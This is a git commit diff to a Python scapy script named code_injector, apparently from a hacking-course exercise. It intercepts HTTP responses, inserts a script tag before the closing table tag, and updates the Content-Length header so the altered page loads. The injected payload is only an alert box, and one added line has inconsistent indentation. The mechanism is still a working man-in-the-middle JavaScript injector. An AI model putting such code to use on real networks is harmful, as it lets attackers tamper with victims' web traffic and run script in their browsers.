aa2bd94955d66549ee4d6e7926ba28528fdc836d
maxicorbs <61736384+maxicorbs@users.noreply.github.com>
2022-10-20 08:53:04 +0100

    o

--- code_injector/code_injector.py
+++ code_injector/code_injector.py
@@ -37,11 +37,13 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            print(scapy_packet.show())
-           load = load.replace("</table>","<script>alert('injected');</script></table>")
+           injection_code = "<script>alert('injected');</script>"
+           load = load.replace("</table>", injection_code + "</table>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search:
                content_length = content_length_search.group(1)
-               print(content_length)
+               new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
